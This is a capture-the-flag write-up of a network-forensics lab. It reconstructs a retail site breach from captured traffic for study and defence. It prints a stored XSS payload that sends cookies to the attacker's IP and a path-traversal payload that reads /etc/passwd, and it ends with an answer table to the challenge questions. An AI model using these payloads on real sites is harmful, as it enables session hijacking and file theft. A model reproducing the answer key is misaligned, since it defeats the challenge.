---
title: RetailBreach
platform: CyberDefenders
category: Network Forensics
difficulty: Easy
skills: Wireshark, PCAP analysis, XSS analysis, session hijacking, LFI identification
---

# RetailBreach — CyberDefenders

## Scenario
Working as a cybersecurity analyst at ShopSphere, an online retail platform, I was brought in after the security team noticed an unusual pattern of administrative logins happening late at night. The goal was to go through the captured network traffic and figure out what actually happened — how the attacker got in, what they did, and what they walked away with.

## Objective
Trace the attack from initial reconnaissance through to impact: identify the attacker, the tools and techniques used to find an entry point, the exact payload used to compromise the application, when it was triggered, what was stolen as a result, and how the attacker escalated from there to read sensitive files off the server.

## Methodology

**Attacker's IP address**
Reviewed the HTTP traffic in the capture for a source generating abnormal request patterns — high-volume, sequential requests to non-existent paths — a strong sign of automated scanning. That traffic all came from `111.224.180.128`.

**Brute-forcing tool identification**
Followed the suspicious requests from that IP and checked the `User-Agent` header on them. Directory brute-forcing tools tend to leave a fingerprint there, and this one identified itself as `gobuster`.

**XSS payload**
Once the attacker had mapped the site, I looked for where they pivoted from recon to actually injecting something. Filtering for POST requests around that time (product reviews, in this case) turned up a submission containing `<script>fetch('http://111.224.180.128/' + document.cookie);</script>` — a straightforward stored XSS aimed at exfiltrating cookies to the attacker's own server.

**Timestamp the admin was hit**
With the payload identified, I filtered for the next request to the attacker's IP carrying a cookie value in the query string — that's the moment the injected script actually fired in someone's browser. That request landed at `2024-03-29 12:09` UTC, which lines up with an admin viewing the page holding the malicious review.

**Stolen session token**
The cookie value sent to the attacker's IP in that same request was the session token: `lqkctf24s9h9lg67teu8uevn3q`.

**Exploited script**
Traced the attacker's subsequent requests, now carrying the stolen session cookie, to see what they accessed with it. They went after `log_viewer.php`.

**LFI payload**
Looking at the parameters passed into `log_viewer.php`, the attacker had swapped the expected filename for a path traversal string: `../../../../../etc/passwd` — using the log viewer to read a file well outside its intended directory.

## Key Findings / IOCs

| # | Question | Answer |
|---|----------|--------|
| 1 | Attacker's IP address | `111.224.180.128` |
| 2 | Directory brute-forcing tool | `gobuster` |
| 3 | XSS payload | `<script>fetch('http://111.224.180.128/' + document.cookie);</script>` |
| 4 | Timestamp admin hit by XSS (UTC) | `2024-03-29 12:09` |
| 5 | Stolen session token | `lqkctf24s9h9lg67teu8uevn3q` |
| 6 | Exploited script | `log_viewer.php` |
| 7 | LFI payload | `../../../../../etc/passwd` |

## Lessons Learned
- Stored XSS is especially dangerous on pages admins are guaranteed to view eventually (like product reviews awaiting approval) — the attacker doesn't need the admin to click anything, just to do their job.
- A session token is a bearer credential — once it's stolen, the attacker doesn't need a password, they just need to present that cookie before it expires or gets invalidated.
- `log_viewer.php` accepting a raw filename parameter with no path sanitization is what turned a stolen session into full LFI. Any endpoint that takes a filename as input needs to validate against a fixed directory, not just check that the session is authenticated.
- User-Agent strings are an easy, high-value thing to check early — default tool signatures like gobuster's give away automation immediately if nothing's stripping or spoofing them.
